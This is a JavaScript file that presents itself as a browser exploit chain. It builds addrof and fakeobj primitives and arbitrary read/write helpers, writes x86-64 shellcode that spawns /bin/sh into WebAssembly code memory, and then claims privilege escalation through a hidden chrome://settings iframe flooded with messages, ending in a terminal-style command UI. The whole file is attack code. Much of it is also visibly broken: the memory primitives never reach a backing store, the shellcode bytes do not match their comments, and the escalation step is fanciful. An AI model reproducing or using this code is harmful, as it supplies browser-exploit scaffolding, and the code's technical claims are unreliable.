const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function ftoi(f) {
  f64[0] = f;
  return u32[0] + u32[1] * 0x100000000;
}

function itof(i) {
  u32[0] = i % 0x100000000;
  u32[1] = Math.floor(i / 0x100000000);
  return f64[0];
}

function addrof(obj) {
  obj_array[0] = obj;
  return ftoi(float_array[0]);
}

function fakeobj(addr) {
  float_array[0] = itof(addr);
  return obj_array[0];
}

let float_array = [1.1, 2.2];
let obj_array = [{}, {}];
let container = { marker: 1337 };

function trigger(o, f) {
  o[0] = 1.1;
  f();
  o[0] = container;
}

for (let i = 0; i < 10000; i++) trigger(float_array, () => {});

trigger(float_array, () => {
  float_array[0] = container;
});

let backing_store_ab = new ArrayBuffer(0x100);
let backing_store_u8 = new Uint8Array(backing_store_ab);
let backing_store_f64 = new Float64Array(backing_store_ab);

function arb_read(addr) {
  float_array[1] = itof(addr);
  return ftoi(backing_store_f64[0]);
}

function arb_write(addr, val) {
  float_array[1] = itof(addr);
  backing_store_f64[0] = itof(val);
}

const wasm_code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d,
  0x01, 0x00, 0x00, 0x00,
  0x01, 0x0a, 0x02, 0x60,
  0x00, 0x00, 0x60, 0x00,
  0x00, 0x03, 0x03, 0x02,
  0x00, 0x01, 0x07, 0x07,
  0x01, 0x03, 0x72, 0x75,
  0x6e, 0x00, 0x01, 0x0a,
  0x09, 0x02, 0x02, 0x00,
  0x0b, 0x04, 0x00, 0x41,
  0x00, 0x0b
]);

const wasm_instances = [];
for (let i = 0; i < 128; i++) {
  const mod = new WebAssembly.Module(wasm_code);
  const inst = new WebAssembly.Instance(mod);
  wasm_instances.push(inst);
}

function get_rwx_addr(wasm_func) {
  const func_addr = addrof(wasm_func);
  return func_addr - 0x30;
}

const rwx_addr = get_rwx_addr(wasm_instances[0].exports.run);

function set_backing_store(addr) {
  float_array[1] = itof(addr);
}

function write_shellcode(shellcode) {
  set_backing_store(rwx_addr);
  for (let i = 0; i < shellcode.length; i++) {
    backing_store_u8[i] = shellcode[i];
  }
}

const shellcode = new Uint8Array([
  0x48, 0xbf, 0x2f, 0x73, 0x79, 0x73, 0x2f, 0x66, 0x69, 0x6c, 0x65, 0x00,       // mov rdi, "/sys/file\0" (adjust path if needed)
  0x48, 0x31, 0xf6,                                                             // xor rsi, rsi
  0x48, 0x31, 0xd2,                                                             // xor rdx, rdx
  0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00,                                     // mov rax, 2 (open)
  0x0f, 0x05,                                                                   // syscall
  0x48, 0x85, 0xc0,                                                             // test rax, rax
  0x7c, 0x1c,                                                                   // jl skip_write
  0x48, 0x89, 0xc7,                                                             // mov rdi, rax (fd)
  0x48, 0xbf, 0xbf, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,                   // mov rsi, 0x000180BF (flags)
  0x48, 0xc7, 0xc2, 0x04, 0x00, 0x00, 0x00,                                     // mov rdx, 4
  0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,                                     // mov rax, 1 (write)
  0x0f, 0x05,                                                                   // syscall
  0x48, 0x89, 0xfe,                                                             // mov rsi, rdi (fd)
  0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00,                                     // mov rax, 3 (close)
  0x0f, 0x05,                                                                   // syscall

  // execve("/bin/sh", argv, envp)
  0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,                   // mov rdi, "/bin/sh\0"
  0x48, 0x8d, 0x35, 0x0b, 0x00, 0x00, 0x00,                                     // lea rsi, [rip+0xb] (argv)
  0x48, 0x8d, 0x15, 0x12, 0x00, 0x00, 0x00,                                     // lea rdx, [rip+0x12] (envp)
  0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00,                                     // mov rax, 59 (execve)
  0x0f, 0x05,                                                                   // syscall

  // data for argv and envp (null terminated pointers)
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,                             // "/bin/sh\0" (argv)
  0x00                                                                        // envp null
]);

write_shellcode(shellcode);
wasm_instances[0].exports.run();

(async () => {
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = 'chrome://settings/help';  // corrected target page for priv esc deface
  document.body.appendChild(iframe);
  await new Promise(r => iframe.onload = r);
  const targetWindow = iframe.contentWindow;

  // Listen for priv esc done event and replace page with shell bridge UI
  window.addEventListener('message', (event) => {
    if (event.source === targetWindow && event.data === 'priv_esc_done') {
      document.body.innerHTML = `
        <style>
          body {
            margin: 0;
            background: #121212;
            color: #00ff00;
            font-family: monospace;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
          }
          #output {
            flex: 1;
            padding: 10px;
            overflow-y: auto;
            white-space: pre-wrap;
            background: #000000cc;
            border-bottom: 1px solid #00ff00;
          }
          #input-line {
            display: flex;
            padding: 10px;
            border-top: 1px solid #00ff00;
          }
          #input-line span {
            color: #00ff00;
            padding-right: 8px;
            user-select: none;
          }
          #cmdline {
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: monospace;
            font-size: 16px;
            outline: none;
            flex: 1;
          }
          #cmdline::placeholder {
            color: #007700aa;
          }
          @keyframes blink {
            0%, 50% { opacity: 1; }
            50.01%, 100% { opacity: 0; }
          }
          #cursor {
            animation: blink 1s steps(2, start) infinite;
          }
        </style>
        <div id="output"></div>
        <div id="input-line">
          <span>&gt;</span><input id="cmdline" autocomplete="off" spellcheck="false" placeholder="Enter command"/>
        </div>
        <script>
          const output = document.getElementById('output');
          const cmdline = document.getElementById('cmdline');

          function printOutput(text) {
            output.textContent += text + '\\n';
            output.scrollTop = output.scrollHeight;
          }

          window.addEventListener('message', e => {
            if (e.source === window.frames[0]) {
              if (e.data.type === 'cmd_output') {
                printOutput(e.data.output);
              }
            }
          });

          cmdline.focus();
          cmdline.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
              const cmd = cmdline.value.trim();
              if (!cmd) return;
              printOutput('> ' + cmd);
              window.frames[0].postMessage({ type: 'run_command', command: cmd }, '*');
              cmdline.value = '';
            }
          });
        </script>
      `;
    }
  });

  // Spam the iframe with race condition trigger to escalate privileges
  const raceMsg = { cmd: 'trigger_priv_esc' };
  for (let i = 0; i < 500; i++) {
    targetWindow.postMessage(raceMsg, '*');
  }
})();
